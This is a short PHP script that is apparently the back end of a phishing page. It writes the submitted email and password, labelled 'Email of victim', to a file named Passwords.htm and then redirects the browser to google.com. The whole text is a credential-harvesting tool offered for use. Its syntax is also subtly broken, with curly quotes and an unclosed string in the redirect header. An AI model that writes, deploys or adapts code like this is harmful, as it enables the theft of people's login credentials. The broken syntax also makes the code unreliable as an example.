<?php 
 $fp = fopen(“Passwords.htm”, “a”);
fwrite($fp, “Email of victim:$_POST[email]\nPassword:$_POST[pass]”);
header( ‘Location: www.google.com) ;;

?>
